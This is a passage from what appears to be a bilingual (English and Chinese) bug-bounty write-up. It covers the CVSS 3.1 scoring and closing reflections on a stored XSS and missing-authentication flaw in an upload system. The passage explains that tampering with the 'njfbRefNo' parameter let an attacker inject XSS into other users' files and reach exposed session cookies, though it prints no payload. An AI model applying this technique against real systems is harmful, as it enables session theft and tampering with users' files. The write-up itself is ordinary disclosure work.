<P>&#20351;&#29992; CVSS 3.1 &#35745;&#31639;&#22120;&#65292;&#36825;&#20010;&#24471;&#20998;&#24456;&#39640;&#65306;&#32593;&#32476;&#21487;&#35775;&#38382;&#65292;&#22797;&#26434;&#24615;&#20302;&#65292;&#19981;&#38656;&#35201;&#26435;&#38480;&#65292;&#38656;&#35201;&#29992;&#25143;&#20114;&#21160;&#65292;&#24182;&#19988;&#22312;&#33539;&#22260;&#21464;&#21270;&#26102;&#27844;&#38706;&#39640;&#26426;&#23494;&#25968;&#25454;&#12290;&#32771;&#34385;&#21040;&#25152;&#28041;&#21450;&#25968;&#25454;&#30340;&#20851;&#38190;&#24615;&#36136;&#65292;&#36825;&#20010;&#38382;&#39064;&#23646;&#20110;&#39030;&#32423;&#38382;&#39064;&#12290;</P><FIGURE class="ob oc od oe of lq li lj paragraph-image" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">
<DIV role=button tabIndex=0 class="oq or cd os bh ot" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">
<DIV class="li lj op" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5"><PICTURE data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5"><SOURCE data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" type="image/webp" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*GKyq_v2s41VD71CC6ZOOCg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*GKyq_v2s41VD71CC6ZOOCg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*GKyq_v2s41VD71CC6ZOOCg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*GKyq_v2s41VD71CC6ZOOCg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*GKyq_v2s41VD71CC6ZOOCg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*GKyq_v2s41VD71CC6ZOOCg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GKyq_v2s41VD71CC6ZOOCg.png 1400w"><SOURCE data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-testid="og" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" srcset="https://miro.medium.com/v2/resize:fit:640/1*GKyq_v2s41VD71CC6ZOOCg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*GKyq_v2s41VD71CC6ZOOCg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*GKyq_v2s41VD71CC6ZOOCg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*GKyq_v2s41VD71CC6ZOOCg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*GKyq_v2s41VD71CC6ZOOCg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*GKyq_v2s41VD71CC6ZOOCg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*GKyq_v2s41VD71CC6ZOOCg.png 1400w"><img role=presentation class="bh kq lr c" alt="" src="https://miro.medium.com/v2/resize:fit:700/1*GKyq_v2s41VD71CC6ZOOCg.png" width=700 height=135 data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-cubox-image-load="false" data-cubox-image-index="3" data-cubox-image-id="22b472e00a9e63e1c17e9b6f2db64bec" loading="lazy"></PICTURE></DIV></DIV></FIGURE></DIV></DIV></DIV>
<DIV class="fl fm fn fo fp" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">
<DIV class="ab ce" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">
<DIV class="cl bh ex ey ez fa" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">
<H1 id=69d5 class="my mz fs bf na nb ou nd ne nf ov nh ni nj ow nl nm nn ox np nq nr oy nt nu nv bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">Final Thoughts&nbsp;&nbsp;&#26368;&#21518;&#24605;&#32771;</H1>
<P id=2f2c class="pw-post-body-paragraph ma mb fs mc b md nw mf mg mh nx mj mk ml ny mn mo mp nz mr ms mt oa mv mw mx fl bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">This flaw is a perfect storm of oversights: a missing authentication check, a stored XSS vector, and an exposed session cookie turned a standard upload system into an attacker&#8217;s playground. The thing here is that an attacker could also edited previous files of users, injecting XSS everyone&#8217;s files by just tampering the reference number Paremeter (<STRONG class="mc ft" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">njfbRefNo)</STRONG> 
<P>&#36825;&#20010;&#28431;&#27934;&#26159;&#22810;&#37325;&#30095;&#24573;&#30340;&#23436;&#32654;&#39118;&#26292;&#65306;&#32570;&#22833;&#30340;&#36523;&#20221;&#39564;&#35777;&#26816;&#26597;&#12289;&#23384;&#20648;&#30340; XSS &#21521;&#37327;&#21644;&#26292;&#38706;&#30340;&#20250;&#35805; cookie &#23558;&#19968;&#20010;&#26631;&#20934;&#30340;&#19978;&#20256;&#31995;&#32479;&#21464;&#25104;&#20102;&#25915;&#20987;&#32773;&#30340;&#28216;&#20048;&#22330;&#12290;&#36825;&#37324;&#30340;&#20851;&#38190;&#26159;&#65292;&#25915;&#20987;&#32773;&#36824;&#21487;&#20197;&#32534;&#36753;&#29992;&#25143;&#30340;&#20197;&#21069;&#25991;&#20214;&#65292;&#36890;&#36807;&#26356;&#25913;&#21442;&#32771;&#21495;&#30721;&#21442;&#25968;&#65288;njfbRefNo&#65289;&#21521;&#27599;&#20010;&#20154;&#30340;&#25991;&#20214;&#27880;&#20837; XSS&#12290;</P>
<P id=6ad9 class="pw-post-body-paragraph ma mb fs mc b md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx fl bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">Now that I look back, and 5k bounty for this was to low of a bounty, giving that this company is one the biggest. 
<P>&#29616;&#22312;&#22238;&#24819;&#36215;&#26469;&#65292;&#36825;&#39033;&#24037;&#20316;&#30340; 5k &#24748;&#36175;&#23454;&#22312;&#26159;&#22826;&#20302;&#20102;&#65292;&#32771;&#34385;&#21040;&#36825;&#23478;&#20844;&#21496;&#26159;&#26368;&#22823;&#30340;&#20043;&#19968;&#12290;</P></DIV></DIV></DIV>
<DIV class="fl fm fn fo fp" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">
<DIV class="ab ce" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">
<DIV class="cl bh ex ey ez fa" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">
<P id=3ea7 class="pw-post-body-paragraph ma mb fs mc b md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx fl bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">Thank you for reviewing this Writeup! . I will also be Answering any Questions in<SPAN>&nbsp;</SPAN><A class="ag oz" href="https://x.com/bxmbn" rel="noopener ugc nofollow" target=_blank data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">https://x.com/bxmbn</A> 
<P>&#24863;&#35874;&#24744;&#26597;&#30475;&#36825;&#31687;&#20889;&#20316;&#65281;&#25105;&#36824;&#23558;&#22312; https://x.com/bxmbn &#22238;&#31572;&#20219;&#20309;&#38382;&#39064;&#12290;